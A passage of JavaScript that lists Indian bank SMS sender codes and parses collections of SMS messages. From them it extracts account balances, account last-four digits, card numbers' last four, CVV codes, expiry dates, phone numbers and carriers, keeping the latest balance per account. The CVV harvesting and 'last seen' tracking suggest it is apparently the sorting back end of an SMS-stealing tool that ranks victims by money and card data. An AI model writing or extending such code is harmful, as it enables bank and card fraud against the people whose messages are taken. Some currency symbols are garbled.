  // Punjab Gramin Bank
  'PGBSMS','PGBBNK','PGBSSL',
  // Rajasthan Marudhara Gramin Bank
  'RMGB','RMGBNK','RMGSMS',
  // Saptagiri Grameena Bank
  'SPTGNB','SPTGBNK',
  // Sutlej Gramin Bank
  'SUTGNB','SUTGBNK',
  // Telangana Grameena Bank
  'TLGBNK','TLGSMS',
  // Uttar Bihar Gramin Bank
  'UBGBNK','UBGSMS',
  // Uttarakhand Gramin Bank
  'UKGBNK','UKGSMS',
  // Vananchal Gramin Bank
  'VNCGNB','VNCGBNK',
  // Vidharbha Konkan Gramin Bank
  'VKGBNK','VKGSMS',
  // Aryavart Bank (RRB)
  'ARYVRT','ARYBNK','ARYSMS','ARYSSL',
  // Prathama UP Gramin Bank
  'PTHMGB','PRTGNB',
  // Tamil Nadu Grama Bank
  'TNGRMB','TNGSMS',
  // Pragathi Krishna Gramin Bank
  'PKGB','PKGBNK',
  // Tripura Gramin Bank
  'TRGBNK',
  // Sri Visakha Grameena Bank
  'SVGBNK',
  // Jharkhand Rajya Gramin Bank
  'JRGBNK',
  // Bangiya Gramin Vikash Bank
  'BGVBNK',
  // Himachal Pradesh Gramin Bank
  'HPGBNK',
  // Nagaland Rural Bank
  'NAGBNK',
  // Manipur Rural Bank
  'MANRBN',
  // Arunachal Pradesh Rural Bank
  'APRBNK',
  // Puduvai Bharathiar Grama Bank
  'PBGBNK',
  // Saurashtra Gramin Bank
  'SRGBNK',
  // Extra SBI / Associate bank codes ───────────────────────────────────────
  'SBIPNB','SBICOB','SBICCB',
  // Extra HDFC codes ────────────────────────────────────────────────────────
  'HDFCNL','HDFCBL','HDFC',
  // Extra ICICI codes ───────────────────────────────────────────────────────
  'ICICIN2','ICICWL',
  // Extra Axis codes ────────────────────────────────────────────────────────
  'AXISNL','AXISBL2',
  // OneCard / FPL Technologies ──────────────────────────────────────────────
  'ONECRD','ONECARD','FPLTCH',
  // slice (credit card NBFC) ────────────────────────────────────────────────
  'SLICEB','SLICSM','SLICEBNK',
  // Amazon Pay Later ────────────────────────────────────────────────────────
  'AMZNPAY','AMZPAY','AMAZONP',
  // Capital Float / Lending ─────────────────────────────────────────────────
  'CAPFLT','CAPFIN',
];

// Extended FULL_BANK_MAP — maps sender codes to display names
var FULL_BANK_MAP = {
  // SBI
  'SBIINB':'SBI','SBIMSG':'SBI','SBIPSG':'SBI','SBICRD':'SBI','SBIUPI':'SBI',
  'SBIBNK':'SBI','SBIFRD':'SBI','SBIREM':'SBI','SBIATM':'SBI','SBIPAY':'SBI',
  'SBISSL':'SBI','SBIYOU':'SBI','SBISMS':'SBI','SBIOTP':'SBI','SBIALT':'SBI',
  'SBIACC':'SBI','SBIGOV':'SBI','SBIGEN':'SBI','SBICSH':'SBI','SBICAR':'SBI',
  'SBICRM':'SBI','SBIFRM':'SBI','SBIFIN':'SBI',
  // HDFC
  'HDFCBK':'HDFC Bank','HDFCBN':'HDFC Bank','HDFCCC':'HDFC Bank','HDCBKL':'HDFC Bank',
  'HDFCSM':'HDFC Bank','HDFCNB':'HDFC Bank','HDFCAL':'HDFC Bank','HDFCLT':'HDFC Bank',
  'HDFCSL':'HDFC Bank','HDFCPB':'HDFC Bank','HDFCRD':'HDFC Bank','HDFCLO':'HDFC Bank',
  'HDFCAC':'HDFC Bank','HDFCMS':'HDFC Bank','HDFCNE':'HDFC Bank',
  // ICICI
  'ICICIB':'ICICI Bank','ICICIC':'ICICI Bank','ICICIN':'ICICI Bank','ICICRD':'ICICI Bank',
  'ICICIBANK':'ICICI Bank','ICICIL':'ICICI Bank','ICICIS':'ICICI Bank','ICICIBU':'ICICI Bank',
  'ICICMB':'ICICI Bank','ICICCI':'ICICI Bank','ICICII':'ICICI Bank','ICICIP':'ICICI Bank',
  'ICICIM':'ICICI Bank',
  // Axis
  'AXISBK':'Axis Bank','AXISBN':'Axis Bank','AXISCC':'Axis Bank','AXISNB':'Axis Bank',
  'AXISCB':'Axis Bank','AXISBL':'Axis Bank','AXISMO':'Axis Bank','AXISLT':'Axis Bank',
  'AXISRD':'Axis Bank','AXISAC':'Axis Bank','AXISSM':'Axis Bank','AXISFT':'Axis Bank',
  // Kotak
  'KOTAKB':'Kotak Bank','KOTAK':'Kotak Bank','KOTAKM':'Kotak Bank','KOTKMB':'Kotak Bank',
  'KOTKCC':'Kotak Bank','KOTAKL':'Kotak Bank','KOTKSL':'Kotak Bank','KOTAKN':'Kotak Bank',
  'KOTAKC':'Kotak Bank','KOTAKS':'Kotak Bank','KOTKRD':'Kotak Bank',
  // PNB
  'PNBSMS':'PNB','PNBNBD':'PNB','PNBBNK':'PNB','PNBCRD':'PNB','PNBSSL':'PNB',
  'PNBREM':'PNB','PNBMOB':'PNB','PNBALR':'PNB','PNBCC':'PNB','PNBNB':'PNB',
  // BOB
  'BOBSMS':'Bank of Baroda','BARBNK':'Bank of Baroda','BOBBRD':'Bank of Baroda',
  'BOBBNK':'Bank of Baroda','BARBCC':'Bank of Baroda','BOBIBL':'Bank of Baroda',
  'BOBCRD':'Bank of Baroda','BOBPAY':'Bank of Baroda','BOBSSL':'Bank of Baroda',
  'BOBREM':'Bank of Baroda','BOBMOB':'Bank of Baroda','BOBALT':'Bank of Baroda',
  'BOBIFN':'Bank of Baroda','BOBGEN':'Bank of Baroda','BOBATM':'Bank of Baroda',
  'BOBINB':'Bank of Baroda','BOBALR':'Bank of Baroda','BOBPIN':'Bank of Baroda',
  'BOBACS':'Bank of Baroda','BOBINF':'Bank of Baroda',
  // Vijaya Bank (merged into BOB)
  'VJYBK':'Bank of Baroda','VIJBNK':'Bank of Baroda',
  // Dena Bank (merged into BOB)
  'DENABNK':'Bank of Baroda','DENBNK':'Bank of Baroda',
  // Canara
  'CNRBNK':'Canara Bank','CANBKL':'Canara Bank','CANBNK':'Canara Bank','CANBK':'Canara Bank',
  'CANABNK':'Canara Bank','CANARA':'Canara Bank','CANBNL':'Canara Bank',
  'CANSSL':'Canara Bank','CANREM':'Canara Bank','CANALR':'Canara Bank',
  // Syndicate Bank (merged into Canara)
  'SYNBNK':'Canara Bank','SYNDBNK':'Canara Bank',
  // Union Bank
  'UBISMS':'Union Bank','UNIONB':'Union Bank','UNBNKL':'Union Bank','UNIONBI':'Union Bank',
  'UBINBK':'Union Bank','UBIOTP':'Union Bank','UBIACC':'Union Bank','UBISMS':'Union Bank',
  'UBIBNK':'Union Bank','UBIRAL':'Union Bank','UNIBNK':'Union Bank','UNIOTP':'Union Bank',
  // Corp Bank / Andhra (merged into Union)
  'CORPBN':'Union Bank','CORPBNK':'Union Bank','ANDRBNK':'Union Bank','ANDHBNK':'Union Bank',
  // BOI
  'BOIIND':'Bank of India','BOISMS':'Bank of India','BOIBNK':'Bank of India',
  'BOICRD':'Bank of India','BOISSL':'Bank of India','BOIMOB':'Bank of India',
  'BOIALR':'Bank of India','BOIOTP':'Bank of India','BOINBK':'Bank of India',
  // Indian Bank
  'INDBNK':'Indian Bank','INDBKS':'Indian Bank','INDIANB':'Indian Bank',
  'INDSSL':'Indian Bank','INDOTP':'Indian Bank','INDMOB':'Indian Bank',
  'INDALR':'Indian Bank','INDACC':'Indian Bank',
  // Allahabad Bank (merged into Indian Bank)
  'ALLABNK':'Indian Bank','ALLBNK':'Indian Bank',
  // Yes Bank
  'YESBNK':'Yes Bank','YESBKL':'Yes Bank','YESBNL':'Yes Bank','YESBKS':'Yes Bank',
  'YESSSL':'Yes Bank','YESOTP':'Yes Bank','YESMOB':'Yes Bank','YESALR':'Yes Bank',
  'YESCRD':'Yes Bank','YESNBK':'Yes Bank',
  // IndusInd
  'INDUSL':'IndusInd Bank','INDUSIN':'IndusInd Bank','INDUSB':'IndusInd Bank',
  'INDIND':'IndusInd Bank','INDUSBNK':'IndusInd Bank','INDUS':'IndusInd Bank',
  // RBL
  'RBLBNK':'RBL Bank','RBLCRD':'RBL Bank','RBLSMS':'RBL Bank','RBLSSL':'RBL Bank',
  'RBLOTP':'RBL Bank','RBLMOB':'RBL Bank','RBLALR':'RBL Bank',
  // IDBI
  'IDBIBNK':'IDBI Bank','IDBISM':'IDBI Bank','IDBICC':'IDBI Bank','IDBISL':'IDBI Bank',
  'IDBIOTP':'IDBI Bank','IDBIMOB':'IDBI Bank','IDBIALR':'IDBI Bank',
  // IDFC First
  'IDFCBK':'IDFC First Bank','IDFCFB':'IDFC First Bank','IDFCCC':'IDFC First Bank',
  'IDFCSM':'IDFC First Bank','IDFCBL':'IDFC First Bank','IDFCFST':'IDFC First Bank',
  'IDFCOTP':'IDFC First Bank','IDFCMOB':'IDFC First Bank','IDFCALR':'IDFC First Bank',
  // Federal
  'FEDERAL':'Federal Bank','FEDBNK':'Federal Bank','FEDBKL':'Federal Bank',
  'FEDBK':'Federal Bank','FEDFIN':'Federal Bank','FEDSSL':'Federal Bank',
  'FEDOTP':'Federal Bank','FEDMOB':'Federal Bank','FEDALR':'Federal Bank',
  // South Indian Bank
  'SIBSMS':'South Indian Bank','SIBANK':'South Indian Bank','SOUTHIB':'South Indian Bank',
  'SIBBNK':'South Indian Bank','SIBSSL':'South Indian Bank',
  // Karnataka Bank
  'KARNBNK':'Karnataka Bank','KTKBNK':'Karnataka Bank','KTKBK':'Karnataka Bank',
  'KARBNK':'Karnataka Bank',
  // Bandhan
  'BANDHAN':'Bandhan Bank','BNDHBN':'Bandhan Bank','BNDHSM':'Bandhan Bank',
  'BANDHBN':'Bandhan Bank',
  // AU SFB
  'AUSFBN':'AU Small Finance Bank','AUBANK':'AU Small Finance Bank',
  'AUSFBL':'AU Small Finance Bank','AUSFB':'AU Small Finance Bank',
  'AUBNK':'AU Small Finance Bank','AU-BANK':'AU Small Finance Bank',
  // Ujjivan
  'UJJBNK':'Ujjivan SFB','UJJIBN':'Ujjivan SFB','UJJISF':'Ujjivan SFB','UJJSFB':'Ujjivan SFB',
  // Airtel Payments Bank
  'AIRBPB':'Airtel Payments Bank','AIRTLB':'Airtel Payments Bank',
  'AIRBNK':'Airtel Payments Bank','AIRPAY':'Airtel Payments Bank',
  // Paytm Payments Bank
  'PAYTMBNK':'Paytm Payments Bank','PAYTMB':'Paytm Payments Bank',
  'PYTMBN':'Paytm Payments Bank','PAYTMBK':'Paytm Payments Bank',
  // FINO
  'FINOBNK':'FINO Payments Bank','FINOPB':'FINO Payments Bank','FINOBK':'FINO Payments Bank',
  // Equitas SFB
  'EQUBK':'Equitas SFB','EQUSMS':'Equitas SFB','EQUSFB':'Equitas SFB','EQUITAS':'Equitas SFB',
  // Jana SFB
  'JSFBNK':'Jana SFB','JANASF':'Jana SFB','JANASFB':'Jana SFB',
  // Suryoday SFB
  'SRYDAY':'Suryoday SFB','SURYOD':'Suryoday SFB','SRYDSFB':'Suryoday SFB',
  // ESAF SFB
  'ESAFSB':'ESAF SFB','ESAFBN':'ESAF SFB','ESAFSFB':'ESAF SFB',
  // UCO Bank
  'UCOBK':'UCO Bank','UCOBNK':'UCO Bank',
  // CSB Bank
  'CSBBNK':'CSB Bank','CSBSMS':'CSB Bank',
  // Dhanlaxmi Bank
  'DHANBNK':'Dhanlaxmi Bank','DLBBNK':'Dhanlaxmi Bank',
  // J&K Bank
  'JKBBNK':'J&K Bank','JKBANK':'J&K Bank','JKBSMS':'J&K Bank',
  // KVG Bank
  'KVBSMS':'KVG Bank','KVBBNK':'KVG Bank','KVGBNK':'KVG Bank',
  // Tamilnad Mercantile
  'TMEBNK':'Tamilnad Mercantile Bank','TMBBNK':'Tamilnad Mercantile Bank','TMBSMS':'Tamilnad Mercantile Bank',
  // DBS / LVB
  'DBSSMS':'DBS Bank','DBSBNK':'DBS Bank','DBSIND':'DBS Bank',
  'LVBSMS':'DBS Bank','LVBBNK':'DBS Bank',
  // Standard Chartered
  'SCBNKS':'Standard Chartered','SCBSMS':'Standard Chartered','STANCHR':'Standard Chartered',
  // Citibank
  'CITIBN':'Citibank','CITIBK':'Citibank','CITICC':'Citibank','CITIBNK':'Citibank',
  // HSBC
  'HSBCBN':'HSBC','HSBCSM':'HSBC','HSBCIN':'HSBC','HSBCBNK':'HSBC',
  // Deutsche Bank
  'DEUTBN':'Deutsche Bank','DEUTCC':'Deutsche Bank','DEUTBK':'Deutsche Bank',
  // Saraswat Bank
  'SARASW':'Saraswat Bank','SRSWBN':'Saraswat Bank','SARSWT':'Saraswat Bank',
  // SVC Bank
  'SVCBNK':'SVC Bank','SVCBNL':'SVC Bank',
  // Punjab & Sind
  'PSBBNK':'Punjab & Sind Bank','PUNJSND':'Punjab & Sind Bank',
  // IOB
  'IOBSMS':'Indian Overseas Bank','IOBBNK':'Indian Overseas Bank',
  // Central Bank
  'CBIBNK':'Central Bank of India','CENBNK':'Central Bank of India','CNTBNK':'Central Bank of India',
  // Bank of Maharashtra
  'MAHBNK':'Bank of Maharashtra','BOMBNK':'Bank of Maharashtra','BOFMAH':'Bank of Maharashtra',
  // Nainital Bank
  'NAINBNK':'Nainital Bank','NAINBL':'Nainital Bank',
  // Capital SFB
  'CAPSFB':'Capital SFB','CAPBNK':'Capital SFB',
  // PNB (Oriental / United merger)
  'ORIBKK':'PNB','ORIBNK':'PNB','UNBKNL':'PNB','UNITDBNK':'PNB',
  // Abhyudaya Bank
  'AMBNK':'Abhyudaya Bank','ABHDYA':'Abhyudaya Bank',
  // Karur Vysya Bank
  'KVBSMS':'KVG Bank',
  // City Union Bank
  'CUBBNK':'City Union Bank','CITYUNB':'City Union Bank',
  // Lakshmi Vilas Bank
  'LKBBNK':'Lakshmi Vilas Bank','LAXMIVB':'Lakshmi Vilas Bank',
  // India Post Payments Bank (IPPB)
  'IPBMSG':'India Post Payments Bank','IPPBNK':'India Post Payments Bank',
  'IPPB':'India Post Payments Bank','INDPST':'India Post Payments Bank',
  'IPBBNK':'India Post Payments Bank','IPBPAY':'India Post Payments Bank',
  'IPBSSL':'India Post Payments Bank','IPBOTP':'India Post Payments Bank',
  'IPPBMG':'India Post Payments Bank','IPPBSM':'India Post Payments Bank',
  'IPPBBN':'India Post Payments Bank',
  // Jio Payments Bank
  'JIOPAY':'Jio Payments Bank','JIOPYB':'Jio Payments Bank',
  'JIOPB':'Jio Payments Bank','JIOBNK':'Jio Payments Bank',
  'JIOBPB':'Jio Payments Bank','JIOPBS':'Jio Payments Bank',
  // NSDL Payments Bank
  'NSDLPB':'NSDL Payments Bank','NSDLPAY':'NSDL Payments Bank',
  'NSDLBN':'NSDL Payments Bank','NSDLBT':'NSDL Payments Bank',
  // Fincare SFB
  'FNCBNK':'Fincare SFB','FNCARE':'Fincare SFB','FINCRE':'Fincare SFB',
  'FINCSFB':'Fincare SFB','FINCBNK':'Fincare SFB',
  // Utkarsh SFB
  'UTKBNK':'Utkarsh SFB','UTKSFB':'Utkarsh SFB','UTKSBN':'Utkarsh SFB',
  // Cosmos Bank
  'COSMOB':'Cosmos Bank','COSMBNK':'Cosmos Bank',
  // NKGSB Co-op Bank
  'NKGSBB':'NKGSB Bank','NKGSBN':'NKGSB Bank',
  // TJSB Sahakari Bank
  'TJSBBN':'TJSB Sahakari Bank','TJSBNK':'TJSB Sahakari Bank',
  // HDB Financial Services
  'HDBFIN':'HDB Financial Services','HDBFSL':'HDB Financial Services','HDBFSV':'HDB Financial Services',
  // Bajaj Finance
  'BAJFIN':'Bajaj Finance','BAJFSV':'Bajaj Finserv','BAJAJF':'Bajaj Finance','BAJCRD':'Bajaj Finance',
  // LIC Housing Finance
  'LICHFL':'LIC Housing Finance','LICHF':'LIC Housing Finance','LICHFN':'LIC Housing Finance',
  // Repco Bank
  'REPCOBNK':'Repco Bank','REPCOB':'Repco Bank','REPCOS':'Repco Bank',
  // Manappuram Finance
  'MANAPP':'Manappuram Finance','MANFIN':'Manappuram Finance',
  // Apna Sahakari Bank
  'APNABN':'Apna Sahakari Bank',
  // Kalyan Janata Sahakari
  'KJSBNK':'Kalyan Janata Sahakari Bank',
  // Janata Sahakari Bank
  'JANASB':'Janata Sahakari Bank','JSBNK':'Janata Sahakari Bank',
  // Mahesh Bank
  'MAHESH':'AP Mahesh Bank',
  // Regional Rural Banks
  'APGBSM':'Andhra Pragathi Grameena Bank','APGBBNK':'Andhra Pragathi Grameena Bank',
  'BRKGB':'Baroda Rajasthan Gramin Bank','BUPGB':'Baroda UP Gramin Bank',
  'CGGBNK':'Chaitanya Godavari Grameena Bank',
  'DCGNBK':'Deccan Grameena Bank','DCGBNK':'Deccan Grameena Bank',
  'KARGB':'Karnataka Gramin Bank','KAVGNB':'Karnataka Vikas Grameena Bank',
  'KLGBNK':'Kerala Gramin Bank',
  'MBGBNK':'Madhya Bihar Gramin Bank',
  'MPGBNK':'Madhya Pradesh Gramin Bank',
  'PGBSMS':'Punjab Gramin Bank','PGBBNK':'Punjab Gramin Bank',
  'RMGB':'Rajasthan Marudhara Gramin Bank','RMGBNK':'Rajasthan Marudhara Gramin Bank',
  'TLGBNK':'Telangana Grameena Bank',
  'UBGBNK':'Uttar Bihar Gramin Bank',
  'UKGBNK':'Uttarakhand Gramin Bank',
  'VKGBNK':'Vidharbha Konkan Gramin Bank',
  'ARYVRT':'Aryavart Bank','ARYBNK':'Aryavart Bank',
  'TNGRMB':'Tamil Nadu Grama Bank',
  'PKGB':'Pragathi Krishna Gramin Bank','PKGBNK':'Pragathi Krishna Gramin Bank',
  'SVGBNK':'Sri Visakha Grameena Bank',
  'TNGSMS':'Tamil Nadu Grama Bank',
  'SRGBNK':'Saurashtra Gramin Bank',
  'HPGBNK':'Himachal Pradesh Gramin Bank',
  // NBFCs / Credit
  'ONECRD':'OneCard','ONECARD':'OneCard',
  'SLICEB':'Slice','SLICSM':'Slice',
  'HDBFSL':'HDB Financial Services',
  // Fullerton India
  'FULIND':'Fullerton India',
};

// Build regex from whitelist for fast matching
var BANK_SENDERS = new RegExp('(?:^|[^A-Z])(' + REAL_BANK_SENDERS.join('|') + ')(?:[^A-Z]|$)', 'i');

// Strict: sender must match whitelist AND body must have financial keywords
// This blocks fake SMS apps that use generic senders
function isRealBankSms(sender, text) {
  // ── STEP 1: Block ALL telecom/SIM plan/recharge/pack/expiry SMS ──────────────
  // These come from JIOPAY/AIRTEL/VI senders but are NOT bank balance alerts.
  var telecomBlock = [
    /recharge/i,
    /\brecharge[d]?\b/i,
    /plan\s+(rs|expire|valid|activat)/i,
    /plan\s+has\s+expired/i,
    /your\s+plan/i,
    /jio\s+number/i,
    /data\s+pack/i,
    /pack\s+(expire|valid|activat)/i,
    /validity\s+(expire|of|extend)/i,
    /\d+GB\/D/i,
    /\d+D_\d+GB/i,
    /unlimited\s+(call|data|sms)/i,
    /sim\s+expired/i,
    /mobile\s+recharge/i,
    /prepaid\s+(plan|pack|recharge)/i,
    /postpaid\s+(bill|due|plan)/i,
    /dth\s+recharge/i,
    /talktime/i,
    /free\s+\d+GB/i,
    /rs\s*\d+_\d+d/i,
    /\d+_\d+D_/i,
  ];
  for (var ti = 0; ti < telecomBlock.length; ti++) {
    if (telecomBlock[ti].test(text)) return false;
  }

  var sRaw = (sender || '').toUpperCase();
  var sClean = sRaw.replace(/[^A-Z0-9]/g, '');
  var sNoPrefix = sRaw.replace(/^[A-Z]{2}-/, '').replace(/[^A-Z0-9]/g, '');
  var sCoreBoth = sNoPrefix.replace(/[A-Z]$/, '');

  if (sClean.length < 5 && sNoPrefix.length < 5) return false;

  var senderOk = REAL_BANK_SENDERS.some(function(id) {
    if (sClean    === id)              return true;
    if (sNoPrefix === id)              return true;
    if (sCoreBoth === id)              return true;
    if (sClean.indexOf(id)    !== -1)  return true;
    if (sNoPrefix.indexOf(id) !== -1)  return true;
    if (sCoreBoth.indexOf(id) !== -1)  return true;
    return false;
  });
  if (!senderOk) return false;

  // ── STEP 2: JIOPAY/Airtel Payments Bank senders need STRICT bank keywords ──
  // They send both telecom AND real bank SMSes — require explicit balance/account.
  var isPaymentsBankSender = /JIOPAY|JIOPYB|JIOPB|JIOBPB|AIRBPB|AIRTLB|AIRBNK|AIRPAY|AIRTPB|PAYTMB|PAYTMBNK|FINOBNK|FINOPB|IPBMSG|IPPBNK/.test(sNoPrefix);
  if (isPaymentsBankSender) {
    // Payments bank senders MUST have these real bank-specific keywords to qualify
    var strictBankMarkers = [
      /(?:avl|avbl|available)\s*bal/i,
      /a\/c\s*(?:no|num|number|xx)/i,
      /(?:credited|debited)\s+(?:to|from|with|rs|inr|₹)/i,
      /(?:bal(?:ance)?)\s*(?:is|:|-)?\s*(?:rs|inr|₹)/i,
      /(?:your|a\/c|account)\s*(?:balance|bal)/i,
      /(?:UPI|NEFT|RTGS|IMPS|NACH)\s*(?:ref|no|txn|id)?/i,
      /transferred\s+(?:rs|inr|₹)/i,
      /(?:withdrawal|deposit)\s+(?:of\s+)?(?:rs|inr|₹)/i,
    ];
    var strictOk = strictBankMarkers.some(function(r) { return r.test(text); });
    if (!strictOk) return false;
  }

  // ── STEP 3: Standard marker check for all other bank senders ────────────────
  var markers = [
    /(?:INR|Rs\.?|₹)/i,
    /(?:a\/c|acct?|account)/i,
    /(?:credited|debited|credit|debit)/i,
    /(?:avl|avbl|available|bal(?:ance)?)/i,
    /(?:txn|transaction)/i,
    /(?:X{2,}\d{2,6}|\d{2,6}X{2,})/i,
    /(?:withdraw|transfer|payment|paid|received)/i,
    /(?:UPI|NEFT|RTGS|IMPS|NACH)/i,
  ];
  var markerCount = markers.filter(function(r) { return r.test(text); }).length;
  return markerCount >= 1;
}

var BANK_BODY = /a\/c|account|balance|bal\.|credited|debited|INR|Rs\.|\u20B9|avl|available|transaction|txn/i;
var CARD_BODY = /card|cvv|credit card|debit card|xxxx|mastercard|visa|rupay|\.card/i;
var UPI_BODY  = /upi|@upi|paytm|gpay|phonepe|bhim|vpa|upi\s*pin|mpin/i;
var BANK_NAME_MAP = {
  HDFCBK:'HDFC Bank', SBIINB:'SBI', SBIMSG:'SBI', SBIPSG:'SBI', SBICRD:'SBI',
  ICICIB:'ICICI Bank', AXISBK:'Axis Bank', KOTAKB:'Kotak Bank',
  PNBSMS:'PNB', BARBNK:'Bank of Baroda', BOBBRD:'Bank of Baroda',
  CNRBNK:'Canara Bank', UBISMS:'Union Bank', BOIIND:'Bank of India',
  INDBNK:'Indian Bank', YESBNK:'Yes Bank', RBLBNK:'RBL Bank',
  IDBIBNK:'IDBI Bank', IDFCBK:'IDFC First Bank', FEDERAL:'Federal Bank',
  FEDBNK:'Federal Bank', BANDHAN:'Bandhan Bank', AUSFBN:'AU Small Finance Bank',
  UJJBNK:'Ujjivan SFB', PAYTMBNK:'Paytm Payments Bank', FINOBNK:'FINO Payments Bank',
  EQUBK:'Equitas SFB', JSFBNK:'Jana SFB', INDBNL:'IndusInd Bank',
  INDUSL:'IndusInd Bank', KARNBNK:'Karnataka Bank', SIBSMS:'South Indian Bank',
  CSBBNK:'CSB Bank', DHANBNK:'Dhanlaxmi Bank', JKBBNK:'J&K Bank',
  KVBSMS:'KVG Bank', MAHBNK:'Bank of Maharashtra', UCOBK:'UCO Bank',
  AIRBPB:'Airtel Payments Bank', DBSSMS:'DBS Bank', CITIBN:'Citibank',
  HSBCBN:'HSBC', SCBNKS:'Standard Chartered',
};
function getBankName(sender) {
  var sUp = (sender || '').toUpperCase();
  // Check each known code against the sender string
  for (var code in FULL_BANK_MAP) {
    if (sUp.indexOf(code) !== -1) return FULL_BANK_MAP[code];
  }
  // NO fallback — return null for unknown senders
  // This prevents "JM", "AX", "VA" type fake names from appearing
  return null;
}

function extractAmount(text) {
  // Match patterns like Rs. 1,234.56 or INR 1000 or â‚¹500.00
  var patterns = [
    /(?:INR|Rs\.?|â‚¹)\s*([\d,]+(?:\.\d{1,2})?)/gi,
    /([\d,]+(?:\.\d{1,2})?)\s*(?:INR|Rs\.?|â‚¹)/gi,
  ];
  var amounts = [];
  for (var i = 0; i < patterns.length; i++) {
    var m;
    var re = patterns[i];
    while ((m = re.exec(text)) !== null) {
      var val = parseFloat(m[1].replace(/,/g, ''));
      if (!isNaN(val) && val > 0) amounts.push(val);
    }
  }
  return amounts;
}

function extractBalance(text) {
  // Extended patterns covering all common Indian bank SMS balance formats
  var patterns = [
    /(?:avl\.?\s*bal|avbl\.?\s*bal|available\s*bal(?:ance)?|avl\.?\s*balance)[^\d\-]*(?:INR|Rs\.?|\u20b9)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /(?:bal(?:ance)?\s*(?:is|:)?\s*(?:INR|Rs\.?|\u20b9)?\s*)([\d,]+(?:\.\d{1,2})?)/i,
    /(?:INR|Rs\.?|\u20b9)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s*your\s*(?:avl|available|avbl))/i,
    /(?:your\s*(?:a\/c|account)\s*(?:balance|bal)[^\d]*)([\d,]+(?:\.\d{1,2})?)/i,
    /(?:closing\s*bal(?:ance)?[^\d]*)([\d,]+(?:\.\d{1,2})?)/i,
    /(?:net\s*(?:avl|avbl|available)[^\d]*)([\d,]+(?:\.\d{1,2})?)/i,
  ];
  for (var i = 0; i < patterns.length; i++) {
    var m = text.match(patterns[i]);
    if (m) {
      var val = parseFloat(m[1].replace(/,/g, ''));
      if (!isNaN(val) && val >= 0) return val;
    }
  }
  return null;
}

function analyzeSms(msgs) {
  var bankBalances = [];
  var cards = [];
  var phoneNumbers = [];
  var networks = [];

  msgs.forEach(function(m) {
    var text = m.text || '';
    var sender = m.sender || '';
    var isBankSender = isRealBankSms(sender, text);
    // Bank SMS — sender MUST be whitelisted (blocks fake SMS)
    if (isBankSender) {
      var amounts = extractAmount(text);
      var balance = extractBalance(text);
      var isCredit = /credit(?:ed)?/i.test(text) && !/debit/i.test(text);
      var isDebit = /debit(?:ed)?/i.test(text);

      // Account last4
      var accMatch = text.match(/(?:a\/c|acct?|account)[^\d]*(?:xx+|XX+)?(\d{2,6})/i);
      var acc4 = accMatch ? accMatch[1].slice(-4) : null;

      if (amounts.length > 0 || balance !== null) {
        bankBalances.push({
          bankName: getBankName(sender),
          senderName: sender,
          availableBalance: balance !== null ? balance : (amounts[0] || 0),
          hasExplicitBalance: balance !== null,
          transactionAmount: amounts.length > 1 ? amounts[0] : (amounts[0] || null),
          transactionType: isCredit ? 'credit' : (isDebit ? 'debit' : null),
          accountLast4: acc4,
          rawSms: text,                    detectedAt: m.time,
          phoneFromSms: null,
          networkFromSms: null,
        });
      }
    }

    // Card SMS
    if (CARD_BODY.test(text)) {
      var cardMatch = text.match(/(?:xxxx|XX+)(\d{4})/i) || text.match(/(\d{4})\s*\(card\)/i);
      var cvvMatch = text.match(/cvv[\s:]*(\d{3})/i);
      var expiryMatch = text.match(/(?:expiry|exp|valid(?:\s*till)?)\s*:?\s*(\d{2}\/\d{2,4})/i);
      var cardTypeMatch = text.match(/(mastercard|visa|rupay|american express|maestro)/i);

      if (cardMatch || cvvMatch) {
        cards.push({
          cardLast4: cardMatch ? cardMatch[1] : '????',
          cvv: cvvMatch ? cvvMatch[1] : null,
          expiry: expiryMatch ? expiryMatch[1] : null,
          cardType: cardTypeMatch ? cardTypeMatch[1] : null,
          rawSms: text,
        });
      }
    }

    // Phone numbers from SMS
    var phoneMatches = text.match(/(?<![.\d])(\+?[6-9]\d{9})(?![.\d])/g);
    if (phoneMatches) {
      phoneMatches.forEach(function(p) {
        if (phoneNumbers.indexOf(p) === -1) phoneNumbers.push(p);
      });
    }

    // Networks from SMS
    var netMatch = text.match(/(?:airtel|jio|vodafone|vi\b|bsnl|idea|mtnl|cellone|docomo)/i);
    if (netMatch && networks.indexOf(netMatch[0]) === -1) {
      networks.push(netMatch[0]);
    }
  });

  // Remove fake banks — only keep entries where sender maps to a known real bank name
  bankBalances = bankBalances.filter(function(b) {
    return b.bankName && b.bankName.length >= 3 && b.bankName !== b.senderName;
  });

  // Sort newest-first by timestamp
  bankBalances.sort(function(a, b) {
    var ta = a.detectedAt ? (typeof a.detectedAt === 'number' ? a.detectedAt : new Date(a.detectedAt).getTime()) : 0;
    var tb = b.detectedAt ? (typeof b.detectedAt === 'number' ? b.detectedAt : new Date(b.detectedAt).getTime()) : 0;
    return tb - ta;
  });

  // Keep only LATEST per bank account (bankName+accountLast4)
  var seenBanks = {};
  var latestPerBank = [];
  bankBalances.forEach(function(b) {
    var key = (b.bankName || '') + '|' + (b.accountLast4 || '');
    if (!seenBanks[key]) { seenBanks[key] = true; latestPerBank.push(b); }
  });

  return { bankBalances: latestPerBank, cards: cards, phoneNumbers: phoneNumbers, networks: networks };
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Format helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function formatAmount(val) {
  if (val === null || val === undefined) return '0';
  var n = typeof val === 'string' ? parseFloat(val.replace(/,/g, '')) : val;
  if (isNaN(n)) return String(val);
  return n.toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function formatLastSeen(ts) {
  if (!ts) return '';
  var d;
  if (typeof ts === 'number') {
    d = new Date(ts > 1e10 ? ts : ts * 1000);
